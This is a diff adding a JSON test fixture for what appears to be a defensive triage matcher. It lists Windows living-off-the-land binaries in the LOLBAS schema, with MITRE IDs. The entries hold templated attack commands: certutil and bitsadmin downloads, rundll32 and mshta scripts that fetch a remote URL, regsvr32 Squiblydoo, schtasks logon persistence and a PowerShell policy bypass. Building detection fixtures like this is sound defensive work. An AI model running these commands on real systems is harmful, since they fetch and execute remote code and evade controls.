@@ -1,0 +1,83 @@
+[
+  {
+    "Name": "Certutil.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE (Aegis Triage Step 2). Not copied from the LOLBAS project; it follows the public LOLBAS JSON API schema so the matcher can be tested offline.",
+    "Commands": [
+      {"Command": "certutil.exe -urlcache -f {REMOTEURL} {PATH}", "Description": "fixture: download", "Usecase": "fixture", "Category": "Download", "Privileges": "User", "MitreID": "T1105"},
+      {"Command": "certutil.exe -verifyctl -f {REMOTEURL} {PATH}", "Description": "fixture: download", "Usecase": "fixture", "Category": "Download", "Privileges": "User", "MitreID": "T1105"},
+      {"Command": "certutil -decode {PATH:.b64} {PATH}", "Description": "fixture: decode", "Usecase": "fixture", "Category": "Decode", "Privileges": "User", "MitreID": "T1140"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}, {"Path": "C:\\Windows\\SysWOW64\\certutil.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+  },
+  {
+    "Name": "Rundll32.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE.",
+    "Commands": [
+      {"Command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:{REMOTEURL}\")", "Description": "fixture: script proxy", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1218.011"},
+      {"Command": "rundll32.exe {PATH_SMB:.dll},EntryPoint", "Description": "fixture: remote dll", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1218.011"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\rundll32.exe"}, {"Path": "C:\\Windows\\SysWOW64\\rundll32.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+  },
+  {
+    "Name": "Schtasks.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE.",
+    "Commands": [
+      {"Command": "schtasks /create /sc onlogon /tn \"Task\" /tr \"{CMD}\"", "Description": "fixture: create task", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1053.005"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\schtasks.exe"}, {"Path": "C:\\Windows\\SysWOW64\\schtasks.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/"
+  },
+  {
+    "Name": "Regsvr32.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE.",
+    "Commands": [
+      {"Command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "Description": "fixture: squiblydoo", "Usecase": "fixture", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1218.010"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\regsvr32.exe"}, {"Path": "C:\\Windows\\SysWOW64\\regsvr32.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+  },
+  {
+    "Name": "Mshta.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE.",
+    "Commands": [
+      {"Command": "mshta.exe {PATH:.hta}", "Description": "fixture: hta", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1218.005"},
+      {"Command": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL}\"\")\"))", "Description": "fixture: vbscript", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1218.005"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\mshta.exe"}, {"Path": "C:\\Windows\\SysWOW64\\mshta.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+  },
+  {
+    "Name": "Bitsadmin.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE.",
+    "Commands": [
+      {"Command": "bitsadmin /transfer job /download /priority normal {REMOTEURL} {PATH}", "Description": "fixture: download", "Usecase": "fixture", "Category": "Download", "Privileges": "User", "MitreID": "T1197"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\bitsadmin.exe"}, {"Path": "C:\\Windows\\SysWOW64\\bitsadmin.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+  },
+  {
+    "Name": "Powershell.exe",
+    "Description": "SELF-AUTHORED TEST FIXTURE. (The real LOLBAS catalogue has no powershell.exe entry; it is included here so the 'name-only is weak' rule is tested on a binary that is everywhere.)",
+    "Commands": [
+      {"Command": "powershell.exe -ep bypass -file {PATH:.ps1}", "Description": "fixture: script", "Usecase": "fixture", "Category": "Execute", "Privileges": "User", "MitreID": "T1059.001"}
+    ],
+    "Full_Path": [{"Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, {"Path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"}],
+    "Detection": [],
+    "Resources": [],
+    "url": "https://example.invalid/fixture/powershell"
+  }
+]
